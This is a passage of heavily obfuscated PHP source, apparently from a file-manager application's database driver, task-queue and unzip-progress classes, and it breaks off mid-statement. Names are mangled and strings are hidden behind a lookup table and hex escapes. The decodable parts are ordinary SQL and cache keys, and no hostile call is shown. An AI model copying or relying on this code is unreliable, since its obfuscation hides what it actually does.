$this->queryStr, $øğš¤àî)) { $this->table = think_config($ÄªğŞÒ™[1090]) . str_ireplace(think_config($ÄªğŞÒ™[1091]), $ÄªğŞÒ™[472], $øğš¤àî[2]); $ÄçáŒ = (bool) $this->query($ÄªğŞÒ™[1092] . strtoupper($this->table) . $ÄªğŞÒ™[68]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($ÄªğŞÒ™[35], 1); think_status($ÄªğŞÒ™[34]); $this->PDOStatement = $this->_linkID->prepare($œóÁë©); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $˜êÕ¬†ò = $this->PDOStatement->execute($Ç¦© ßÌ); $this->debug(); if (!1 === $˜êÕ¬†ò) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($ÄçáŒ || preg_match($ÄªğŞÒ™[1093], $œóÁë©)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $øÕÃÁæ› = $this->_linkID->commit(); $this->transTimes = 0; if (!$øÕÃÁæ›) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $¡µÔäåÑ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$¡µÔäåÑ) { $this->error(); return !1; } } return !0; } private function getAll() { $çêÁŸÍ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($çêÁŸÍ); return $çêÁŸÍ; } public function getFields($Ïè¥äú¿) { $«È¥‚Ñğ =& $_SERVER[øşô´çË]; $this->initConnect(!0); if (think_config($«È¥‚Ñğ[1094])) { $ÓÔ¹§ĞÎ = str_replace($«È¥‚Ñğ[1095], $Ïè¥äú¿, think_config($«È¥‚Ñğ[1094])); } else { switch ($this->dbType) { case $«È¥‚Ñğ[1078]: case $«È¥‚Ñğ[1096]: $ÓÔ¹§ĞÎ = "\123\105\x4c\x45\x43\x54\40\40\x20\143\x6f\x6c\x75\155\x6e\x5f\156\x61\155\x65\x20\x61\163\x20\47\116\141\155\145\x27\x2c\40\40\x20\x64\x61\x74\141\x5f\164\171\x70\145\x20\141\163\x20\47\124\x79\160\x65\x27\54\40\x20\40\x63\157\x6c\x75\155\156\137\x64\145\x66\x61\165\x6c\x74\x20\x61\x73\x20\x27\x44\x65\146\x61\165\x6c\x74\47\x2c\40\40\40\x69\x73\137\x6e\x75\x6c\154\141\142\x6c\145\x20\x61\x73\40\x27\x4e\x75\154\154\47\xa\x9\x9\106\x52\x4f\x4d\11\x69\156\146\x6f\x72\x6d\141\x74\x69\157\x6e\x5f\163\143\150\x65\x6d\141\x2e\x74\x61\x62\x6c\145\163\40\x41\123\40\x74\xa\11\x9\112\x4f\x49\x4e\11\151\156\146\x6f\x72\x6d\x61\x74\151\157\156\x5f\163\143\x68\x65\155\141\x2e\143\x6f\x6c\x75\x6d\156\x73\40\101\x53\40\143\xa\x9\11\x4f\x4e\40\40\x74\56\x74\141\x62\154\x65\137\143\x61\x74\x61\x6c\157\147\x20\x3d\x20\143\56\164\141\142\154\x65\x5f\x63\141\164\141\x6c\157\147\12\11\x9\x41\116\x44\x20\164\56\x74\x61\x62\x6c\x65\137\x73\143\150\145\x6d\141\x20\75\40\143\56\x74\141\x62\154\145\137\x73\143\150\x65\155\x61\12\x9\x9\x41\116\104\40\164\x2e\x74\141\x62\x6c\x65\x5f\x6e\x61\155\x65\x20\75\x20\x63\56\x74\141\x62\x6c\x65\137\156\141\x6d\145\12\x9\x9\x57\110\x45\x52\105\x20\40\40\x74\x2e\164\141\142\x6c\x65\x5f\156\141\x6d\145\40\x3d\40\x27{$Ïè¥äú¿}\x27"; break; case $«È¥‚Ñğ[1097]: $ÓÔ¹§ĞÎ = $«È¥‚Ñğ[1098] . $Ïè¥äú¿ . $«È¥‚Ñğ[1099]; break; case $«È¥‚Ñğ[1079]: case $«È¥‚Ñğ[1081]: $ÓÔ¹§ĞÎ = $«È¥‚Ñğ[1100] . $«È¥‚Ñğ[1101] . $«È¥‚Ñğ[1102] . strtoupper($Ïè¥äú¿) . $«È¥‚Ñğ[1103] . strtoupper($Ïè¥äú¿) . $«È¥‚Ñğ[1104]; break; case $«È¥‚Ñğ[1105]: $ÓÔ¹§ĞÎ = $«È¥‚Ñğ[1106] . $Ïè¥äú¿ . $«È¥‚Ñğ[1107]; break; case $«È¥‚Ñğ[1080]: break; case $«È¥‚Ñğ[1108]: default: $ÓÔ¹§ĞÎ = $«È¥‚Ñğ[1109] . ($this->dbType == $«È¥‚Ñğ[1108] ? "\x60{$Ïè¥äú¿}\140" : $Ïè¥äú¿); } } $Ú‰•±¿¢ = $this->query($ÓÔ¹§ĞÎ); $ù‰…¬Å = array(); if ($Ú‰•±¿¢) { foreach ($Ú‰•±¿¢ as $¾½¶“Ì  => $ûÔšÇ) { $ûÔšÇ = array_change_key_case($ûÔšÇ); $ûÔšÇ[$«È¥‚Ñğ[42]] = isset($ûÔšÇ[$«È¥‚Ñğ[42]]) ? $ûÔšÇ[$«È¥‚Ñğ[42]] : $«È¥‚Ñğ[472]; $ûÔšÇ[$«È¥‚Ñğ[43]] = isset($ûÔšÇ[$«È¥‚Ñğ[43]]) ? $ûÔšÇ[$«È¥‚Ñğ[43]] : $«È¥‚Ñğ[472]; $£üÕæİ¡ = isset($ûÔšÇ[$«È¥‚Ñğ[360]]) ? $ûÔšÇ[$«È¥‚Ñğ[360]] : $ûÔšÇ[$«È¥‚Ñğ[42]]; $ù‰…¬Å[$£üÕæİ¡] = array($«È¥‚Ñğ[42] => $£üÕæİ¡, $«È¥‚Ñğ[43] => $ûÔšÇ[$«È¥‚Ñğ[43]], $«È¥‚Ñğ[45] => (bool) (isset($ûÔšÇ[$«È¥‚Ñğ[113]]) && $ûÔšÇ[$«È¥‚Ñğ[113]] === $«È¥‚Ñğ[12] || isset($ûÔšÇ[$«È¥‚Ñğ[45]]) && $ûÔšÇ[$«È¥‚Ñğ[45]] === $«È¥‚Ñğ[12]), $«È¥‚Ñğ[47] => isset($ûÔšÇ[$«È¥‚Ñğ[47]]) ? $ûÔšÇ[$«È¥‚Ñğ[47]] : (isset($ûÔšÇ[$«È¥‚Ñğ[66]]) ? $ûÔšÇ[$«È¥‚Ñğ[66]] : $«È¥‚Ñğ[472]), $«È¥‚Ñğ[49] => isset($ûÔšÇ[$«È¥‚Ñğ[105]]) ? strtolower($ûÔšÇ[$«È¥‚Ñğ[105]]) == $«È¥‚Ñğ[51] : (isset($ûÔšÇ[$«È¥‚Ñğ[67]]) ? $ûÔšÇ[$«È¥‚Ñğ[67]] : !1), $«È¥‚Ñğ[52] => isset($ûÔšÇ[$«È¥‚Ñğ[1110]]) ? strtolower($ûÔšÇ[$«È¥‚Ñğ[1110]]) == $«È¥‚Ñğ[54] : (isset($ûÔšÇ[$«È¥‚Ñğ[105]]) ? $ûÔšÇ[$«È¥‚Ñğ[105]] : !1)); } } return $ù‰…¬Å; } public function getTables($’’°¢ãô = '') { $£Äó¯‹ë =& $_SERVER[øşô´çË]; if (think_config($£Äó¯‹ë[1111])) { $—¹•òó… = str_replace($£Äó¯‹ë[1112], $’’°¢ãô, think_config($£Äó¯‹ë[1111])); } else { switch ($this->dbType) { case $£Äó¯‹ë[1079]: case $£Äó¯‹ë[1081]: $—¹•òó… = $£Äó¯‹ë[1113]; break; case $£Äó¯‹ë[1078]: case $£Äó¯‹ë[1096]: $—¹•òó… = $£Äó¯‹ë[1114]; break; case $£Äó¯‹ë[1105]: $—¹•òó… = $£Äó¯‹ë[1115]; break; case $£Äó¯‹ë[1080]: think_exception(think_lang($£Äó¯‹ë[1116]) . $£Äó¯‹ë[1117]); break; case $£Äó¯‹ë[1097]: $—¹•òó… = $£Äó¯‹ë[55] . $£Äó¯‹ë[56] . $£Äó¯‹ë[57]; break; case $£Äó¯‹ë[1108]: default: if (!empty($’’°¢ãô)) { $—¹•òó… = $£Äó¯‹ë[1057] . $’’°¢ãô . $£Äó¯‹ë[1058]; } else { $—¹•òó… = $£Äó¯‹ë[1059]; } } } $•Ÿ£ñ‡ñ = $this->query($—¹•òó…); $“û¿ĞÒ = array(); foreach ($•Ÿ£ñ‡ñ as $úˆ«ÈÌÈ => $ÜîİèŒ°) { $“û¿ĞÒ[$úˆ«ÈÌÈ] = current($ÜîİèŒ°); } return $“û¿ĞÒ; } protected function parseLimit($×ì¦Ğ£) { $š’Ñ™‡” =& $_SERVER[øşô´çË]; $ıÙîä† = $š’Ñ™‡”[12]; if (!empty($×ì¦Ğ£)) { switch ($this->dbType) { case $š’Ñ™‡”[1105]: case $š’Ñ™‡”[1097]: $×ì¦Ğ£ = explode($š’Ñ™‡”[60], $×ì¦Ğ£); if (count($×ì¦Ğ£) > 1) { $ıÙîä† .= $š’Ñ™‡”[61] . $×ì¦Ğ£[1] . $š’Ñ™‡”[62] . $×ì¦Ğ£[0] . $š’Ñ™‡”[63]; } else { $ıÙîä† .= $š’Ñ™‡”[61] . $×ì¦Ğ£[0] . $š’Ñ™‡”[63]; } break; case $š’Ñ™‡”[1078]: case $š’Ñ™‡”[1096]: break; case $š’Ñ™‡”[1080]: break; case $š’Ñ™‡”[1079]: case $š’Ñ™‡”[1081]: break; case $š’Ñ™‡”[1108]: default: $ıÙîä† .= $š’Ñ™‡”[61] . $×ì¦Ğ£ . $š’Ñ™‡”[63]; } } return $ıÙîä†; } public function parseKey(&$¿šåÒ™ú, $Õïª¨¸Õ = true) { $îƒñ’Ô =& $_SERVER[øşô´çË]; if ($Õïª¨¸Õ) { $¿šåÒ™ú = $this->parseKeyCheck($¿šåÒ™ú); } if ($this->dbType == $îƒñ’Ô[1108]) { if ($¿šåÒ™ú != $îƒñ’Ô[230] && !preg_match($îƒñ’Ô[1072], $¿šåÒ™ú)) { $¿šåÒ™ú = $îƒñ’Ô[484] . trim($¿šåÒ™ú, $îƒñ’Ô[484]) . $îƒñ’Ô[484]; } return $¿šåÒ™ú; } else { return parent::parseKey($¿šåÒ™ú, $Õïª¨¸Õ); } } public function close() { $this->_linkID = null; } public function error() { $øáÊÎóõ =& $_SERVER[øşô´çË]; if ($this->PDOStatement) { $Ö‰»²ï = $this->PDOStatement->errorInfo(); $this->error = $Ö‰»²ï[1] . $øáÊÎóõ[4] . $Ö‰»²ï[2]; } else { $this->error = $øáÊÎóõ[12]; } if ($øáÊÎóõ[12] != $this->queryStr) { $this->error .= LNG($øáÊÎóõ[58]) . $this->queryStr; } think_trace($this->error, $øáÊÎóõ[12], $øáÊÎóõ[59]); return $this->error; } public function escapeString($ô¬ë¯òë) { $ˆÕ»´Û =& $_SERVER[øşô´çË]; switch ($this->dbType) { case $ˆÕ»´Û[1105]: case $ˆÕ»´Û[1078]: case $ˆÕ»´Û[1096]: case $ˆÕ»´Û[1108]: return addslashes($ô¬ë¯òë); case $ˆÕ»´Û[1080]: case $ˆÕ»´Û[1097]: case $ˆÕ»´Û[1079]: case $ˆÕ»´Û[1081]: return str_ireplace($ˆÕ»´Û[68], $ˆÕ»´Û[69], $ô¬ë¯òë); } } protected function parseValue($­«Éá¹Ç) { $Ãµîıôí =& $_SERVER[øşô´çË]; if (is_string($­«Éá¹Ç)) { $°î¤Ç¯” = strpos($­«Éá¹Ç, $Ãµîıôí[4]) === 0 && in_array($­«Éá¹Ç, array_keys($this->bind)); $­«Éá¹Ç = $°î¤Ç¯” ? $this->escapeString($­«Éá¹Ç) : $Ãµîıôí[1118] . $this->escapeString($­«Éá¹Ç) . $Ãµîıôí[1118]; } elseif (isset($­«Éá¹Ç[0]) && is_string($­«Éá¹Ç[0]) && strtolower($­«Éá¹Ç[0]) == $Ãµîıôí[381]) { $­«Éá¹Ç = $this->escapeString($­«Éá¹Ç[1]); } elseif (is_array($­«Éá¹Ç)) { $­«Éá¹Ç = array_map(array($this, $Ãµîıôí[1119]), $­«Éá¹Ç); } elseif (is_bool($­«Éá¹Ç)) { $­«Éá¹Ç = $­«Éá¹Ç ? $Ãµîıôí[101] : $Ãµîıôí[238]; } elseif (is_null($­«Éá¹Ç)) { $­«Éá¹Ç = $Ãµîıôí[113]; } return $­«Éá¹Ç; } public function getLastInsertId() { $î®Ïø‡™ =& $_SERVER[øşô´çË]; switch ($this->dbType) { case $î®Ïø‡™[1105]: case $î®Ïø‡™[1097]: case $î®Ïø‡™[1078]: case $î®Ïø‡™[1096]: case $î®Ïø‡™[1080]: case $î®Ïø‡™[1108]: return $this->_linkID->lastInsertId(); case $î®Ïø‡™[1079]: case $î®Ïø‡™[1081]: $ºäĞîÕØ = $this->table; $¼ş¯ÙÑ¼ = $this->query("\123\x45\114\105\x43\x54\40{$ºäĞîÕØ}\56\143\x75\162\162\166\x61\x6c\x20\143\165\162\x72\x76\141\154\x20\106\x52\x4f\x4d\x20\x64\165\x61\154"); return $¼ş¯ÙÑ¼ ? $¼ş¯ÙÑ¼[0][$î®Ïø‡™[1120]] : 0; } } } class DbSqlite extends DbSqliteBase { protected function _execSql($Óşç¨Åú) { if (!$this->_linkID || !$Óşç¨Åú) { return; } sqlite_query($this->_linkID, $Óşç¨Åú); } protected function initConnectAfter() { $†¤Ü¾Èñ =& $_SERVER[øşô´çË]; $this->_execSql($†¤Ü¾Èñ[1121]); $this->_execSql($†¤Ü¾Èñ[1122]); } public function query($ÅÅ´¿˜) { $ŸÌ÷ê¢º = parent::query($ÅÅ´¿˜); return $ŸÌ÷ê¢º; } public function execute($Ö¦²öÍ) { $ÁºÅ™Îè =& $_SERVER[øşô´çË]; if (!CacheLock::fileLock($ÁºÅ™Îè[1123])) { return !1; } $½ÆÙ“Æ’ = parent::execute($Ö¦²öÍ); CacheLock::fileUnLock($ÁºÅ™Îè[1123]); return $½ÆÙ“Æ’; } } class DbSqlite3 extends DbSqlite3Base { protected function _execSql($ßáƒ‚§Ë) { if (!$this->_linkID || !$ßáƒ‚§Ë) { return; } $this->_linkID->exec($ßáƒ‚§Ë); } protected function initConnectAfter() { $½¼§¦¹¯ =& $_SERVER[øşô´çË]; $this->_execSql($½¼§¦¹¯[1121]); $this->_execSql($½¼§¦¹¯[1122]); } public function query($æëß–ü’) { $›ô„ì³» = parent::query($æëß–ü’); return $›ô„ì³»; } public function execute($Ì«åëÓÒ) { $ïÊğªâ =& $_SERVER[øşô´çË]; if (!CacheLock::fileLock($ïÊğªâ[1123])) { return !1; } $ Äô¿ãÊ = parent::execute($Ì«åëÓÒ); CacheLock::fileUnLock($ïÊğªâ[1123]); return $ Äô¿ãÊ; } } goto BğÇêåï—·; fš³Ô•›Ü: class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\x74\x61\163\x6b\x51\165\x65\165\x65\x4c\145\x6e\147\x74\150"; const QUEUE_DATA = "\164\141\163\x6b\121\165\x65\x75\145\104\141\164\x61"; const QUEUE_TIME = "\x74\141\x73\x6b\121\165\145\x75\x65\x4c\141\x73\164\x52\165\x6e"; const QUEUE_THREAD = "\164\141\x73\153\121\x75\x65\x75\145\124\150\x72\x65\141\144"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($¸ŠÊÂ±, $‘†èçş¡ = array(), $®¦Ø×ï = '', $Ûšãö†Å = '') { $Õ˜ëÈôÚ =& $_SERVER[øşô´çË]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($Ûšãö†Å && array_find_by_field(self::$listData, $Õ˜ëÈôÚ[105], $Ûšãö†Å)) { return !0; } if ($Ûšãö†Å && array_find_by_field(self::$listDataAdd, $Õ˜ëÈôÚ[105], $Ûšãö†Å)) { return !0; } self::$listDataAdd[] = array($Õ˜ëÈôÚ[351] => $¸ŠÊÂ±, $Õ˜ëÈôÚ[2080] => $‘†èçş¡, $Õ˜ëÈôÚ[549] => $®¦Ø×ï, $Õ˜ëÈôÚ[105] => $Ûšãö†Å); return !0; } public static function addSubmit() { $Í…À¿–Ê =& $_SERVER[øşô´çË]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($Í…À¿–Ê[2081] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $Í…À¿–Ê[12], $Í…À¿–Ê[549])), $Í…À¿–Ê[205]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($ùÄ•êÇû, $Œú¢Áéû = array(), $à°îø¥¶ = '', $ò¯ïèøõ = '') { $õ°ûÃ›§ =& $_SERVER[øşô´çË]; if (self::count() >= self::MAX_LENGTH) { return !1; } $¡±Ù×ûÄ = self::getAll(); if ($ò¯ïèøõ && array_find_by_field($¡±Ù×ûÄ, $õ°ûÃ›§[105], $ò¯ïèøõ)) { return !0; } $¡±Ù×ûÄ[] = array($õ°ûÃ›§[351] => $ùÄ•êÇû, $õ°ûÃ›§[2080] => $Œú¢Áéû, $õ°ûÃ›§[549] => $à°îø¥¶, $õ°ûÃ›§[105] => $ò¯ïèøõ); self::setAll($¡±Ù×ûÄ); write_log($õ°ûÃ›§[2081] . $à°îø¥¶, $õ°ûÃ›§[205]); return !0; } public static function run() { $éÀÔĞ‚¬ =& $_SERVER[øşô´çË]; $‡‰æšÆÅ = self::getAll(); $ßæ ï§® = array_shift($‡‰æšÆÅ); if (!$ßæ ï§®) { return !1; } self::setAll($‡‰æšÆÅ); $ÈÓÙñ‚ó = timeFloat(); $Øäş¡å = $éÀÔĞ‚¬[12]; try { $Øäş¡å = Hook::apply($ßæ ï§®[$éÀÔĞ‚¬[351]], $ßæ ï§®[$éÀÔĞ‚¬[2080]]); } catch (Exception $Æ¤¨œˆ”) { write_log($Æ¤¨œˆ”, $éÀÔĞ‚¬[1367]); } $Øúß°‘ = number_format(timeFloat() - $ÈÓÙñ‚ó, 3) . $éÀÔĞ‚¬[1988]; if ($Øäş¡å && is_string($Øäş¡å)) { $Øúß°‘ = $Øúß°‘ . $éÀÔĞ‚¬[2082] . $Øäş¡å; } write_log($éÀÔĞ‚¬[2083] . $ßæ ï§®[$éÀÔĞ‚¬[549]] . $éÀÔĞ‚¬[2084] . $Øúß°‘, $éÀÔĞ‚¬[205]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $¤õ„ÕËà =& $_SERVER[øşô´çË]; $–Å = self::threadCount() + 1; if ($–Å > 3 || !self::count()) { return; } write_log($¤õ„ÕËà[2085] . $–Å, $¤õ„ÕËà[205]); Cache::set(self::QUEUE_THREAD, $–Å, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($¤õ„ÕËà[2086], $¤õ„ÕËà[205]); } public static function getKey($€¦Íáğˆ, $ÏÖã­²ù = "\x69\x6e\164") { $ê±‘ûê =& $_SERVER[øşô´çË]; Cache::removeMemory($€¦Íáğˆ); $Ùá±ƒ„ = Cache::get($€¦Íáğˆ); if ($ÏÖã­²ù == $ê±‘ûê[373]) { return $Ùá±ƒ„ ? intval($Ùá±ƒ„) : 0; } if ($ÏÖã­²ù == $ê±‘ûê[2087]) { return is_array($Ùá±ƒ„) ? $Ùá±ƒ„ : array(); } return $Ùá±ƒ„; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[øşô´çË][2087]); } public static function setAll($¹“ÖÀê€) { $Ç™Œàé´ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($¹“ÖÀê€), $Ç™Œàé´); Cache::set(self::QUEUE_DATA, $¹“ÖÀê€, $Ç™Œàé´); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($€àß³Ö³, $íÑã‹Ç­ = 5.0) { if (!$€àß³Ö³) { return; } $‡ÅéÔ®¸ = Cache::get($€àß³Ö³); if (!$‡ÅéÔ®¸ || timeFloat() - floatVal($‡ÅéÔ®¸) >= $íÑã‹Ç­) { Cache::set($€àß³Ö³, timeFloat(), $íÑã‹Ç­ * 10); return !0; } return !1; } public static function timeLimitCall($ü‚ıÊêÙ, $ÑšãˆÄÓ, $±Í¾ÆÚÈ, $¯š¹¹êÅ = 5.0) { $­ìü”â =& $_SERVER[øşô´çË]; if (!$ü‚ıÊêÙ || !$ÑšãˆÄÓ) { return; } self::$asyncAdd = !0; $©Ú×ı³Ş = $­ìü”â[2088]; $÷’ô¢Ç = Cache::get($©Ú×ı³Ş, !0); $ûÂÑî¦• = array($­ìü”â[2089] => timeFloat(), $­ìü”â[2090] => timeFloat(), $­ìü”â[351] => $ÑšãˆÄÓ, $­ìü”â[2080] => $±Í¾ÆÚÈ, $­ìü”â[2091] => $¯š¹¹êÅ); if (is_array($÷’ô¢Ç[$ü‚ıÊêÙ])) { if (timeFloat() - $÷’ô¢Ç[$ü‚ıÊêÙ][$­ìü”â[2089]] <= $ûÂÑî¦•[$­ìü”â[2091]] * 0.5) { return; } $ûÂÑî¦•[$­ìü”â[2090]] = $÷’ô¢Ç[$ü‚ıÊêÙ][$­ìü”â[2090]]; } $÷’ô¢Ç[$ü‚ıÊêÙ] = $ûÂÑî¦•; Cache::set($©Ú×ı³Ş, $÷’ô¢Ç, 60); Cache::removeMemory($©Ú×ı³Ş); write_log($­ìü”â[2092] . $ü‚ıÊêÙ . $­ìü”â[84] . $ÑšãˆÄÓ . $­ìü”â[2093] . ACTION, $­ìü”â[205]); } public static function timeLimitCallLoop() { $¡´ õ„ù =& $_SERVER[øşô´çË]; $ŞË·‹º = array($¡´ õ„ù[2094]); $ô‡È×â§ = in_array(strtolower(ACTION), $ŞË·‹º); if (!$ô‡È×â§ && !self::$asyncAdd) { return; } $çÂŞ±°ğ = $¡´ õ„ù[2088]; $ƒ¾Ó¾¸ = Cache::get($çÂŞ±°ğ, !0); if (!$ƒ¾Ó¾¸ || count($ƒ¾Ó¾¸) <= 0) { return; } $´‚»È™¦ = timeFloat(); $”¾ƒŒ”¸ = array(); $ê§Åáà = array(); foreach ($ƒ¾Ó¾¸ as $®ìû†ê => $ªì¦ƒÒÓ) { if ($´‚»È™¦ - $ªì¦ƒÒÓ[$¡´ õ„ù[2090]] > $ªì¦ƒÒÓ[$¡´ õ„ù[2091]]) { $ê§Åáà[$®ìû†ê] = $ªì¦ƒÒÓ; continue; } $”¾ƒŒ”¸[$®ìû†ê] = $ªì¦ƒÒÓ; } if (count($ê§Åáà) == 0) { return; } if (count($”¾ƒŒ”¸) == 0) { Cache::remove($çÂŞ±°ğ); } else { Cache::set($çÂŞ±°ğ, $”¾ƒŒ”¸, 60); } Cache::removeMemory($çÂŞ±°ğ); self::runArr($ê§Åáà); } public static function finished($ÛÈçâ­á, $Íë³Üœõ) { $ÛªŒ†¯æ =& $_SERVER[øşô´çË]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($ÛªŒ†¯æ[351] => $ÛÈçâ­á, $ÛªŒ†¯æ[2080] => $Íë³Üœõ); } private static function runArr($Õ³ÎÛÙ) { $åÌİšÎÒ =& $_SERVER[øşô´çË]; if (!$Õ³ÎÛÙ) { return; } foreach ($Õ³ÎÛÙ as $¬®ã¬× => $äÁöò¤§) { try { Hook::apply($äÁöò¤§[$åÌİšÎÒ[351]], $äÁöò¤§[$åÌİšÎÒ[2080]]); write_log($åÌİšÎÒ[2095] . $¬®ã¬× . $åÌİšÎÒ[84] . $äÁöò¤§[$åÌİšÎÒ[351]] . $åÌİšÎÒ[2093] . ACTION, $åÌİšÎÒ[205]); } catch (Exception $áÛì÷ŠÏ) { } } } public static function autoRun() { self::runArr(self::$syncTask); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $è¨ÖÈà„ =& $_SERVER[øşô´çË]; parent::startAfter(); Hook::bind($è¨ÖÈà„[2096], array($this, $è¨ÖÈà„[2097])); Hook::bind($è¨ÖÈà„[1380], array($this, $è¨ÖÈà„[2098])); Hook::bind($è¨ÖÈà„[2099], array($this, $è¨ÖÈà„[2100])); $œ™¦‡Öí =& $this->task; $œ™¦‡Öí[$è¨ÖÈà„[2101]] = $è¨ÖÈà„[1381]; if (!$œ™¦‡Öí[$è¨ÖÈà„[1862]]) { $œ™¦‡Öí[$è¨ÖÈà„[1862]] = LNG($è¨ÖÈà„[2102]); } } protected function endAfter() { $”¥ÑëÌ• =& $_SERVER[øşô´çË]; parent::endAfter(); Hook::unbind($”¥ÑëÌ•[2096], array($this, $”¥ÑëÌ•[2097])); Hook::unbind($”¥ÑëÌ•[1380], array($this, $”¥ÑëÌ•[2098])); Hook::unbind($”¥ÑëÌ•[2099], array($this, $”¥ÑëÌ•[2100])); } public function updateAfter() { $ºÔĞÛä™ =& $_SERVER[øşô´çË]; $Å¨Àüó— =& $this->task; if (!$Å¨Àüó—[$ºÔĞÛä™[1228]] || !$Å¨Àüó—[$ºÔĞÛä™[866]]) { if ($Å¨Àüó—[$ºÔĞÛä™[2101]] != $ºÔĞÛä™[397]) { return; } } if ($Å¨Àüó—[$ºÔĞÛä™[2101]] == $ºÔĞÛä™[1381]) { $ë¥’Ş‹† = 0; if ($Å¨Àüó—[$ºÔĞÛä™[2026]]) { $ë¥’Ş‹† = $Å¨Àüó—[$ºÔĞÛä™[2027]] / $Å¨Àüó—[$ºÔĞÛä™[2026]]; } $Å¨Àüó—[$ºÔĞÛä™[1974]] = $ë¥’Ş‹† * 0.3; } else { if ($Å¨Àüó—[$ºÔĞÛä™[2101]] == $ºÔĞÛä™[397]) { $ë¥’Ş‹† = $Å¨Àüó—[$ºÔĞÛä™[1973]] / $Å¨Àüó—[$ºÔĞÛä™[1228]]; $Å¨Àüó—[$ºÔĞÛä™[1974]] = 0.3 + $ë¥’Ş‹† * 0.4; } else { if ($Å¨Àüó—[$ºÔĞÛä™[2101]] == $ºÔĞÛä™[117]) { $ôã¨¢ª± = 0; if ($Å¨Àüó—[$ºÔĞÛä™[2028]] == $ºÔĞÛä™[117]) { $ôã¨¢ª± = $Å¨Àüó—[$ºÔĞÛä™[2027]]; } $ë¥’Ş‹† = ($Å¨Àüó—[$ºÔĞÛä™[943]] + $ôã¨¢ª±) / $Å¨Àüó—[$ºÔĞÛä™[866]]; $Å¨Àüó—[$ºÔĞÛä™[1974]] = 0.3 + 0.4 + $ë¥’Ş‹† * 0.3; } } } if ($Å¨Àüó—[$ºÔĞÛä™[1974]] > 0) { $Ç‹©Şû± = timeFloat() - $Å¨Àüó—[$ºÔĞÛä™[1976]] - $Å¨Àüó—[$ºÔĞÛä™[1979]]; $Å¨Àüó—[$ºÔĞÛä™[1980]] = $Ç‹©Şû± * (1 - $Å¨Àüó—[$ºÔĞÛä™[1974]]) / $Å¨Àüó—[$ºÔĞÛä™[1974]]; } } public function addFile($©í¦ú‹¶) { $Â˜¬ÏÅ =& $_SERVER[øşô´çË]; $Â¼‹¨«ù =& $this->task; $»¢è¾î‰ = IO::info($©í¦ú‹¶); $Â¼‹¨«ù[$Â˜¬ÏÅ[2024]] = $»¢è¾î‰[$Â˜¬ÏÅ[42]]; $Â¼‹¨«ù[$Â˜¬ÏÅ[2026]] = $»¢è¾î‰[$Â˜¬ÏÅ[89]]; $Â¼‹¨«ù[$Â˜¬ÏÅ[2027]] = 0; $Â¼‹¨«ù[$Â˜¬ÏÅ[1230]] = $Â˜¬ÏÅ[2054]; $Â¼‹¨«ù[$Â˜¬ÏÅ[2028]] = $Â˜¬ÏÅ[1381]; $Â¼‹¨«ù[$Â˜¬ÏÅ[866]] = $»¢è¾î‰[$Â˜¬ÏÅ[89]]; $Â¼‹¨«ù[$Â˜¬ÏÅ[1228]] = 1; $ŠÏ’è² = 0; $Â¼‹¨«ù[$Â˜¬ÏÅ[2036]] = array($Â˜¬ÏÅ[2037] => $ŠÏ’è² + 1, $Â˜¬ÏÅ[518] => $»¢è¾î‰[$Â˜¬ÏÅ[42]], $Â˜¬ÏÅ[97] => $»¢è¾î‰[$Â˜¬ÏÅ[97]], $Â˜¬ÏÅ[611] => $»¢è¾î‰[$Â˜¬ÏÅ[611]] ? $»¢è¾î‰[$Â˜¬ÏÅ[611]] : $»¢è¾î‰[$Â˜¬ÏÅ[97]]); $this->update(); } public function zipEvent($Ú¡ÔèÚš, $º‰÷÷ ½, $‹ñ¦Ê‡ø, $ƒñô«ÎÉ) { $şÖ–©Ÿº =& $_SERVER[øşô´çË]; $º£şÒ‚ =& $this->task; $º£şÒ‚[$şÖ–©Ÿº[2024]] = get_path_this($º‰÷÷ ½); $º£şÒ‚[$şÖ–©Ÿº[2026]] = $ƒñô«ÎÉ; $º£şÒ‚[$şÖ–©Ÿº[2027]] = $‹ñ¦Ê‡ø; $º£şÒ‚[$şÖ–©Ÿº[1230]] = $Ú¡ÔèÚš == $şÖ–©Ÿº[2103] ? $şÖ–©Ÿº[2104] : $şÖ–©Ÿº[2105]; $º£şÒ‚[$şÖ–©Ÿº[2028]] = $şÖ–©Ÿº[12]; $º£şÒ‚[$şÖ–©Ÿº[866]] = $ƒñô«ÎÉ; $º£şÒ‚[$şÖ–©Ÿº[2101]] = $şÖ–©Ÿº[397]; $this->update(); } public function unzipAfter($º†—¡ä) { $Â©Âõáæ =& $_SERVER[øşô´çË]; $±ˆÄİÔí =& $this->task; $±ˆÄİÔí[$Â©Âõáæ[2101]] = 